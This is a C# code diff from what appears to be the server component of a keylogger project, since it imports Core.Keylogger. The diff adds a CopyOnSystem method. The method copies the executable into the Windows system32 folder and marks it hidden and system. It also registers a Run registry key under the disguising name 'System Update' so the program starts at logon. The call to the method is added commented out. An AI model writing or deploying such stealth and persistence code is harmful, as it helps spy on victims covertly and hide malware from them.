@@ -9,6 +9,9 @@ namespace Server
 
     using Core.Connection;
     using Core.Keylogger;
+    using System.Runtime.InteropServices;
+    using System.IO;
+    using Microsoft.Win32;
 
     public static class Program
     {
@@ -71,9 +74,34 @@ namespace Server
                 {
                     Console.ForegroundColor = ConsoleColor.Red;
                     Console.WriteLine("Error: {0}", ex.Message);
-
-                    Thread.Sleep(_environmentConfiguration.RetryIntervalConnection);
                 }
+            }
+        }
+
+        public static async void CopyOnSystem()
+        {
+            try
+            {
+                var appName = string.Format("{0}{1}", AppDomain.CurrentDomain.BaseDirectory, AppDomain.CurrentDomain.FriendlyName);
+                var outputDirectory = string.Format("{0}\\system32\\{1}", Environment.GetEnvironmentVariable("WinDir"), AppDomain.CurrentDomain.FriendlyName);
+
+                if (!File.Exists(outputDirectory))
+                {
+                    File.Copy(appName, outputDirectory);
+                    File.SetAttributes(outputDirectory, FileAttributes.ReadOnly | FileAttributes.System | FileAttributes.Hidden);
+
+                    var key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                    key.SetValue("System Update", appName);
+
+                    key.Close();
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine("Error: {0}", ex.Message);
+
+                Thread.Sleep(2000);
             }
         }
 
@@ -81,6 +109,7 @@ namespace Server
         {
             Task.Run(async () =>
             {
+                // CopyOnSystem();
                 InitializeConnection();
             });
 
